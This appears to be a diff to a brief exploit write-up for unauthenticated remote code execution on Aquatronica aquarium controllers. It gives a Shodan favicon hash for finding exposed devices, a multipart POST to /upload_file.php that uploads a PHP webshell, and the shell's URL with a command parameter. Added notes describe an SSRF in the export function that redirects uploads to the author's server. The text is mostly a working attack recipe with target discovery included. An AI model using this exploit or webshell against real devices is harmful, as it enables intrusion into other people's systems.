@@ -3,6 +3,7 @@ Unauthenticated RCE via fileupload on aquatronica remote shiet
 Shodan: http.favicon.hash:1860999631
 
 
+
 POST /upload_file.php HTTP/1.1
 Host:xx
 User-Agent:xx
@@ -33,3 +34,14 @@ hey.php
 --------------------------6f55f7661e994afc--
 
 webshell on : /uploads/163579449420561301179556/hey.php?cmd=id
+
+Additional notes : 
+
+The finding was fun, i found the upload endpoint early but no idea how to use it..
+But the export function uses it ot upload a CSV file of the results (wtf?) 
+AND there's a ssrf on it (basically, you can whose where to export the result in the export request) 
+so i manage to redirect the form to my serv
+
+Final Warning :
+
+Don't fuck with this, there are fishes behind it..
